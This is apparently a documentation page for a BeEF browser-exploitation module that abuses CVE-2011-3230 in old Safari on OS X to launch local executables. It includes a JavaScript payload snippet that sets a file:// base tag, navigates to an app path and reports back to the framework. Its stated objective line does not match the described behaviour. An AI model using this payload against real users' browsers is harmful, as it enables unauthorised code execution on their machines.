## Summary

* **Objective**: rewrite a selected real URL link to a fake url
* **Authors**: antisnatchor
* **Browsers**: Safari <= 5.1 on OSX

* [Code](https://github.com/beefproject/beef/tree/master/modules/local_host/safari_launch_app)

## Internal Working

Uses the `file://` scheme to launch an executable.

```js
baseTag.setAttribute('href', 'file://');
document.head.appendChild(baseTag);
setTimeout('document.location="<%= @app_path %>";beef.net.send("<%= @command_url %>", <%= @command_id %>, "Command [<%= @app_path %>] launched");', 1000);
```

## References
See CVE-2011-3230 for more details.

## Feedback
